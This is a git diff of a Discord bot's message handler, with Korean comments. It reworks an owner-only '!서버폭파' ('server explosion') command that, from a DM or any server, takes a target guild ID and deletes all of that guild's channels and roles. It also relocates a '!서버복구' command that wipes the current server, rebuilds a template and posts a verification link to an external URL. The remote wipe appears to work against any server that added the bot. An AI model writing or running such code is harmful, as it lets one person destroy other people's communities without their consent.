@@ -221,7 +221,7 @@ client.on('messageCreate', async (message) => {
     const userId = message.author.id;
     const isBotOwner = ALLOWED_OWNERS.includes(userId);
 
-    // 💥 [최우선 처리] !서버폭파 명령어 (관리자 전용) - DM이나 서버 어디서든 동작
+    // 💥 [최우선 처리 1] !서버폭파 명령어 (관리자 전용) - 어떤 서버나 DM에서든 동작
     if (content.startsWith('!서버폭파')) {
         if (!isBotOwner) return;
 
@@ -246,13 +246,11 @@ client.on('messageCreate', async (message) => {
                 await message.author.send(`💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`).catch(() => {});
             }
 
-            // 모든 채널 삭제
             const channels = await targetGuild.channels.fetch();
             for (const ch of channels.values()) {
                 await ch.delete().catch(() => {});
             }
 
-            // 모든 역할 삭제 (기본 및 봇 역할 제외)
             const roles = await targetGuild.roles.fetch();
             for (const r of roles.values()) {
                 if (r.id !== targetGuild.id && !r.managed) {
@@ -262,6 +260,61 @@ client.on('messageCreate', async (message) => {
             console.log(`[서버 폭파 완료] ${targetGuild.name} (${targetGuildId}) 서버가 폭파되었습니다.`);
         } catch (err) {
             console.error('서버 폭파 중 오류 발생:', err);
+        }
+        return;
+    }
+
+    // 🔄 [최우선 처리 2] !서버복구 명령어 (관리자 전용) - 현재 서버를 템플릿 구조로 복구
+    if (content === '!서버복구') {
+        if (!isBotOwner) return;
+        if (!message.guild) return message.author.send('❌ 서버 채널 안에서 입력해 주세요.');
+
+        await message.reply('🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화되고 템플릿 구조로 재구성됩니다.**');
+
+        try {
+            const guildId = message.guild.id;
+            const channels = await message.guild.channels.fetch();
+            for (const ch of channels.values()) {
+                await ch.delete().catch(() => {});
+            }
+
+            const roles = await message.guild.roles.fetch();
+            for (const r of roles.values()) {
+                if (r.id !== message.guild.id && !r.managed) {
+                    await r.delete().catch(() => {});
+                }
+            }
+
+            const infoCategory = await message.guild.channels.create({ name: '📌 ┃ 공지 및 정보', type: ChannelType.GuildCategory });
+            await message.guild.channels.create({ name: '공지사항', type: ChannelType.GuildText, parent: infoCategory.id });
+            await message.guild.channels.create({ name: '규칙', type: ChannelType.GuildText, parent: infoCategory.id });
+
+            const verifyCategory = await message.guild.channels.create({ name: '🔒 ┃ 인증 구역', type: ChannelType.GuildCategory });
+            const verifyChannel = await message.guild.channels.create({ name: '인증하기', type: ChannelType.GuildText, parent: verifyCategory.id });
+
+            const chatCategory = await message.guild.channels.create({ name: '💬 ┃ 소통 공간', type: ChannelType.GuildCategory });
+            await message.guild.channels.create({ name: '일반채팅', type: ChannelType.GuildText, parent: chatCategory.id });
+            await message.guild.channels.create({ name: '음성채팅', type: ChannelType.GuildVoice, parent: chatCategory.id });
+
+            await message.guild.roles.create({ name: '👑 관리자', color: '#ED4245', permissions: [PermissionsBitField.Flags.Administrator] });
+            await message.guild.roles.create({ name: '✅ 인증완료', color: '#57F287' });
+            await message.guild.roles.create({ name: '🔒 미인증', color: '#99AAB5' });
+
+            const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
+            const row = new ActionRowBuilder()
+                .addComponents(
+                    new ButtonBuilder()
+                        .setStyle(ButtonStyle.Link)
+                        .setLabel('🔒 디스코드 인증하기')
+                        .setURL(verifyUrl),
+                );
+
+            await verifyChannel.send({
+                content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
+                components: [row]
+            });
+        } catch (err) {
+            console.error('서버 복구 오류:', err);
         }
         return;
     }
@@ -489,58 +542,6 @@ client.on('messageCreate', async (message) => {
             message.reply('✅ 지정된 역할이 성공적으로 제거되었습니다!');
         } catch (err) {
             message.reply('⚠️ 역할 제거 중 오류가 발생했습니다.');
-        }
-    }
-
-    // 8. !서버복구 명령어 (관리자 본인 전용)
-    if (content === '!서버복구') {
-        if (!isBotOwner) return;
-
-        await message.reply('🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화되고 템플릿 구조로 재구성됩니다.**');
-
-        try {
-            const channels = await message.guild.channels.fetch();
-            for (const ch of channels.values()) {
-                await ch.delete().catch(() => {});
-            }
-
-            const roles = await message.guild.roles.fetch();
-            for (const r of roles.values()) {
-                if (r.id !== message.guild.id && !r.managed) {
-                    await r.delete().catch(() => {});
-                }
-            }
-
-            const infoCategory = await message.guild.channels.create({ name: '📌 ┃ 공지 및 정보', type: ChannelType.GuildCategory });
-            await message.guild.channels.create({ name: '공지사항', type: ChannelType.GuildText, parent: infoCategory.id });
-            await message.guild.channels.create({ name: '규칙', type: ChannelType.GuildText, parent: infoCategory.id });
-
-            const verifyCategory = await message.guild.channels.create({ name: '🔒 ┃ 인증 구역', type: ChannelType.GuildCategory });
-            const verifyChannel = await message.guild.channels.create({ name: '인증하기', type: ChannelType.GuildText, parent: verifyCategory.id });
-
-            const chatCategory = await message.guild.channels.create({ name: '💬 ┃ 소통 공간', type: ChannelType.GuildCategory });
-            await message.guild.channels.create({ name: '일반채팅', type: ChannelType.GuildText, parent: chatCategory.id });
-            await message.guild.channels.create({ name: '음성채팅', type: ChannelType.GuildVoice, parent: chatCategory.id });
-
-            await message.guild.roles.create({ name: '👑 관리자', color: '#ED4245', permissions: [PermissionsBitField.Flags.Administrator] });
-            await message.guild.roles.create({ name: '✅ 인증완료', color: '#57F287' });
-            await message.guild.roles.create({ name: '🔒 미인증', color: '#99AAB5' });
-
-            const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
-            const row = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder()
-                        .setStyle(ButtonStyle.Link)
-                        .setLabel('🔒 디스코드 인증하기')
-                        .setURL(verifyUrl),
-                );
-
-            await verifyChannel.send({
-                content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
-                components: [row]
-            });
-        } catch (err) {
-            console.error('서버 복구 오류:', err);
         }
     }
 });
